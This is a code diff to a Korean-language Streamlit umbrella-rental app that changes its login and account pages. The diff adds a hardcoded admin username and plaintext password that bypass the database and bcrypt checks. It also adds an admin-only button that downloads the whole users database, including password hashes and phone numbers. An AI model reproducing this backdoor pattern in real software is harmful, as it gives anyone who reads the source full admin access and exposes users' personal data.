@@ -87,6 +87,19 @@ def register_user(user_id, password, name, phone, org):
 
 # ---------- 로그인 ----------
 def login_user(user_id, password):
+    # 관리자 계정 체크
+    if user_id == "rising__wing" and password == "2@dou#4ble%AA":
+        # DB에서 찾지 않고 바로 관리자 정보 반환
+        return True, {
+            "id": 0,  # DB에 없는 가짜 값
+            "user_id": "rising__wing",
+            "name": "관리자",
+            "phone": None,
+            "org": "관리자",
+            "is_admin": True
+        }
+
+    # ---- 일반 사용자 로그인 ----
     conn = get_conn()
     cur = conn.cursor()
 
@@ -105,20 +118,22 @@ def login_user(user_id, password):
         return False, "존재하지 않는 아이디입니다."
 
     db_id, db_user_id, db_password_hash, db_name, db_phone, db_org = row
+
     if isinstance(db_password_hash, str):
         db_password_hash = db_password_hash.encode("utf-8")
 
     if bcrypt.checkpw(password.encode("utf-8"), db_password_hash):
-        user_info = {
+        return True, {
             "id": db_id,
             "user_id": db_user_id,
             "name": db_name,
             "phone": db_phone,
             "org": db_org,
+            "is_admin": False
         }
-        return True, user_info
     else:
         return False, "비밀번호가 올바르지 않습니다."
+
 
 # ---------- 우산 대여/반납 관련 함수 ----------
 def get_current_rental(user_db_id):
@@ -208,6 +223,21 @@ def main():
         st.write(f"- 소속: **{user['org'] or '미등록'}**")
 
         st.markdown("---")
+        
+                # ---- 관리자 전용 DB 다운로드 ----
+        if user.get("is_admin", False):
+            st.markdown("### 🛠 관리자 메뉴")
+
+            st.info("관리자 전용 기능입니다. Cloud DB 다운로드 버튼이 활성화됩니다.")
+
+            # DB 다운로드 버튼 활성화
+            with open(DB_PATH, "rb") as f:
+                st.download_button(
+                    label="📥 Cloud DB 다운로드 (users.db)",
+                    data=f,
+                    file_name="users.db",
+                    mime="application/octet-stream"
+                )
 
         # 🌂 우산 대여 / 반납 기능
         st.markdown("### 🌂 우산 대여 / 반납")
@@ -240,13 +270,16 @@ def main():
                 else:
                     st.error(msg)
 
-     
+
+        
+ 
 
         if st.button("로그아웃"):
             st.session_state["user"] = None
             st.session_state["page"] = "home"
             st.rerun()
         return
+
 
     # 2) 메인(랜딩) 페이지 ------------------------
     if st.session_state["page"] == "home":
